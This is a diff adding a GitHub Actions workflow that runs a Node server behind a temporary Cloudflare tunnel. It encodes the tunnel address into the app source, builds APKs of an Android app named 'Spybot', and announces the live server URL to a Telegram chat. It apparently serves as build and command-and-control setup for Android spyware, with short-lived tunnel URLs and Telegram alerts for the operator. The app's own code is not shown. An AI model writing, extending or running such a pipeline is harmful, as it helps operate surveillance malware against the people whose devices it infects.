@@ -1,0 +1,263 @@
+name: Deploy Server & Build APK
+
+on:
+  workflow_dispatch:
+    inputs:
+      duration:
+        description: "Server runtime (minutes)"
+        required: true
+        default: "30"
+        type: choice
+        options: ["5", "10", "15", "30", "60"]
+      build_type:
+        description: "APK build type"
+        required: true
+        default: "release"
+        type: choice
+        options: ["debug", "release", "both"]
+      use_custom_host_socket:
+        description: "Use custom Host & Socket URL"
+        required: true
+        default: false
+        type: boolean
+      custom_host_url:
+        description: "Custom Host URL"
+        required: false
+        default: ""
+        type: string
+      custom_socket_url:
+        description: "Custom Socket URL"
+        required: false
+        default: ""
+        type: string
+
+env:
+  TELEGRAM_BOT_TOKEN: ${{ secrets.TELEGRAM_BOT_TOKEN }}
+  TELEGRAM_CHAT_ID: ${{ secrets.TELEGRAM_CHAT_ID }}
+
+jobs:
+  deploy-and-build:
+    runs-on: ubuntu-latest
+    timeout-minutes: 90
+
+    steps:
+      - name: Verify Required Secrets
+        run: |
+          MISSING_SECRETS=""
+          if [ -z "${{ env.TELEGRAM_BOT_TOKEN }}" ]; then
+            MISSING_SECRETS="TELEGRAM_BOT_TOKEN"
+          fi
+          if [ -z "${{ env.TELEGRAM_CHAT_ID }}" ]; then
+            if [ -n "$MISSING_SECRETS" ]; then
+              MISSING_SECRETS="$MISSING_SECRETS, TELEGRAM_CHAT_ID"
+            else
+              MISSING_SECRETS="TELEGRAM_CHAT_ID"
+            fi
+          fi
+
+          if [ -n "$MISSING_SECRETS" ]; then
+            echo "❌ Missing required secrets: $MISSING_SECRETS"
+            echo "Add them in your repository Settings → Secrets and variables → Actions"
+            exit 1
+          fi
+          echo "✅ All required secrets found"
+
+      - name: Checkout repository
+        uses: actions/checkout@v4
+
+      - name: Detect version
+        id: version
+        run: |
+          GRADLE_FILE=$(find ./app -path "*/app/build.gradle*" -type f | head -n 1)
+          if [ -z "$GRADLE_FILE" ]; then
+            echo "❌ build.gradle not found. Cannot determine version."
+            find ./app -name "*.gradle*" -type f
+            exit 1
+          fi
+          VERSION_NAME=$(grep "versionName" "$GRADLE_FILE" | sed 's/.*versionName[ =]*"\{0,1\}//' | sed 's/".*//')
+          VERSION_CODE=$(grep "versionCode" "$GRADLE_FILE" | sed 's/.*versionCode[ =]*//')
+          echo "version_name=$VERSION_NAME" >> $GITHUB_OUTPUT
+          echo "version_code=$VERSION_CODE" >> $GITHUB_OUTPUT
+          echo "Detected Version: $VERSION_NAME ($VERSION_CODE)"
+
+      - name: Setup Node.js
+        uses: actions/setup-node@v4
+        with:
+          node-version: '20'
+
+      - name: Install server dependencies
+        working-directory: ./server
+        run: npm install
+
+      - name: Create .env file
+        working-directory: ./server
+        run: |
+          echo "TELEGRAM_BOT_TOKEN=${{ env.TELEGRAM_BOT_TOKEN }}" > .env
+          echo "TELEGRAM_CHAT_ID=${{ env.TELEGRAM_CHAT_ID }}" >> .env
+          echo "PORT=8999" >> .env
+
+      - name: Start server
+        id: server
+        working-directory: ./server
+        run: |
+          nohup npm start > /tmp/server.log 2>&1 &
+          SERVER_PID=$!
+          echo "Waiting for server to start..."
+          for i in {1..30}; do
+            if curl -s http://localhost:8999/ > /dev/null 2>&1; then
+              echo "✅ Server ready on port 8999"
+              echo "server_pid=$SERVER_PID" >> $GITHUB_OUTPUT
+              exit 0
+            fi
+            echo "Waiting... ($i/30)"
+            sleep 2
+          done
+          echo "❌ Server failed to start"
+          cat /tmp/server.log
+          exit 1
+
+      - name: Setup Cloudflare tunnel
+        id: tunnel
+        run: |
+          curl -L --output cloudflared.deb https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64.deb
+          sudo dpkg -i cloudflared.deb
+          nohup cloudflared tunnel --url http://localhost:8999 > /tmp/tunnel.log 2>&1 &
+          echo "Waiting for tunnel URL..."
+          TUNNEL_URL=""
+          for i in {1..60}; do
+            sleep 2
+            TUNNEL_URL=$(grep -oE 'https://[a-zA-Z0-9-]+\.trycloudflare\.com' /tmp/tunnel.log | head -1 || true)
+            if [ -n "$TUNNEL_URL" ]; then
+              echo "✅ Tunnel URL: $TUNNEL_URL"
+              break
+            fi
+            echo "Waiting for tunnel... ($i/60)"
+          done
+          if [ -z "$TUNNEL_URL" ]; then
+            echo "❌ Failed to get tunnel URL"
+            cat /tmp/tunnel.log
+            exit 1
+          fi
+          sleep 5
+          curl -s "$TUNNEL_URL/" || echo "⚠️ Tunnel test failed"
+          echo "tunnel_url=$TUNNEL_URL" >> $GITHUB_OUTPUT
+
+      - name: Configure AppTools.kt
+        run: |
+          TUNNEL_URL="${{ steps.tunnel.outputs.tunnel_url }}"
+          USE_CUSTOM_HOST_SOCKET="${{ github.event.inputs.use_custom_host_socket }}"
+          CUSTOM_HOST="${{ github.event.inputs.custom_host_url }}"
+          CUSTOM_SOCKET="${{ github.event.inputs.custom_socket_url }}"
+          if [ "$USE_CUSTOM_HOST_SOCKET" = "true" ]; then
+            HOST_URL="$CUSTOM_HOST"
+            SOCKET_URL="$CUSTOM_SOCKET"
+          else
+            HOST_URL="${TUNNEL_URL}/"
+            SOCKET_URL="${TUNNEL_URL/https:/wss:}/"
+          fi
+          JSON_STRING="{\"host\":\"$HOST_URL\",\"socket\":\"$SOCKET_URL\"}"
+          BASE64_DATA=$(echo -n "$JSON_STRING" | base64 -w 0)
+          APP_TOOLS_FILE="./app/app/src/main/java/com/spybot/app/Utils/AppTools.kt"
+          if [ -f "$APP_TOOLS_FILE" ]; then
+            sed -i "s|private const val DEFAULT_DATA = \"\"|private const val DEFAULT_DATA = \"$BASE64_DATA\"|g" "$APP_TOOLS_FILE"
+            echo "✅ DEFAULT_DATA updated in AppTools.kt"
+          else
+            echo "❌ AppTools.kt not found"
+            exit 1
+          fi
+
+      - name: Setup Java
+        uses: actions/setup-java@v4
+        with:
+          distribution: temurin
+          java-version: 17
+
+      - name: Setup Gradle
+        uses: gradle/actions/setup-gradle@v3
+        with:
+          gradle-version: '8.2'
+
+      - name: Build APK
+        working-directory: ./app
+        run: |
+          chmod +x gradlew
+          BUILD_TYPE="${{ github.event.inputs.build_type }}"
+          echo "Building $BUILD_TYPE APK..."
+          case "$BUILD_TYPE" in
+            debug) ./gradlew assembleDebug --no-daemon ;;
+            release) ./gradlew assembleRelease --no-daemon ;;
+            both) ./gradlew assembleDebug assembleRelease --no-daemon ;;
+          esac
+
+      - name: Prepare APK files
+        id: apk
+        run: |
+          VERSION="${{ steps.version.outputs.version_name }}"
+          BUILD_TYPE="${{ github.event.inputs.build_type }}"
+          mkdir -p ./apk_output
+          
+          if [ "$BUILD_TYPE" = "debug" ] || [ "$BUILD_TYPE" = "both" ]; then
+            DEBUG_APK=$(find ./app/app/build/outputs/apk/debug -name "*-debug.apk" -type f | grep -v "classes-broker" | head -1 || true)
+            if [ -n "$DEBUG_APK" ]; then
+              cp "$DEBUG_APK" "./apk_output/Spybot-v${VERSION}-debug.apk"
+              echo "debug_apk=Spybot-v${VERSION}-debug.apk" >> $GITHUB_OUTPUT
+              echo "✅ Debug APK ready: Spybot-v${VERSION}-debug.apk"
+            else
+              echo "⚠️ Debug APK not found"
+            fi
+          fi
+
+          if [ "$BUILD_TYPE" = "release" ] || [ "$BUILD_TYPE" = "both" ]; then
+            RELEASE_APK=$(find ./app/app/build/outputs/apk/release -name "*-release.apk" -type f | grep -v "classes-broker" | head -1 || true)
+            if [ -n "$RELEASE_APK" ]; then
+              cp "$RELEASE_APK" "./apk_output/Spybot-v${VERSION}-release.apk"
+              echo "release_apk=Spybot-v${VERSION}-release.apk" >> $GITHUB_OUTPUT
+              echo "✅ Release APK ready: Spybot-v${VERSION}-release.apk"
+            else
+              echo "⚠️ Release APK not found"
+            fi
+          fi
+          ls -la ./apk_output/
+
+      - name: Upload APKs
+        uses: actions/upload-artifact@v4
+        with:
+          name: Spybot-APK
+          path: ./apk_output/*.apk
+          retention-days: 7
+          if-no-files-found: error
+
+      - name: Send Telegram notification
+        run: |
+          VERSION="${{ steps.version.outputs.version_name }}"
+          TUNNEL_URL="${{ steps.tunnel.outputs.tunnel_url }}"
+          DURATION="${{ github.event.inputs.duration }}"
+          BUILD_TYPE="${{ github.event.inputs.build_type }}"
+          END_TIME=$(date -d "+$DURATION minutes" '+%H:%M UTC')
+          MESSAGE="🚀 Spybot v${VERSION} Online!%0A📱 Build: $BUILD_TYPE%0A🌐 $TUNNEL_URL%0A⏱️ Duration: $DURATION min%0A🕐 Ends: $END_TIME%0A📥 Download APK from Artifacts"
+          curl -s -X POST "https://api.telegram.org/bot${{ env.TELEGRAM_BOT_TOKEN }}/sendMessage" \
+            -d "chat_id=${{ env.TELEGRAM_CHAT_ID }}" -d "text=$MESSAGE" || echo "⚠️ Telegram notification failed"
+
+      - name: Keep server running
+        run: |
+          DURATION="${{ github.event.inputs.duration }}"
+          TOTAL_SECONDS=$((DURATION * 60))
+          ELAPSED=0
+          while [ $ELAPSED -lt $TOTAL_SECONDS ]; do
+            sleep 60
+            ELAPSED=$((ELAPSED + 60))
+          done
+
+      - name: Send end notification
+        run: |
+          VERSION="${{ steps.version.outputs.version_name }}"
+          MESSAGE="⏰ Spybot v${VERSION} server ended. Re-run workflow to start again."
+          curl -s -X POST "https://api.telegram.org/bot${{ env.TELEGRAM_BOT_TOKEN }}/sendMessage" \
+            -d "chat_id=${{ env.TELEGRAM_CHAT_ID }}" -d "text=$MESSAGE" || true
+
+      - name: Cleanup
+        if: always()
+        run: |
+          pkill -f "node server.js" || true
+          pkill -f cloudflared || true
+          echo "✅ Cleanup completed"
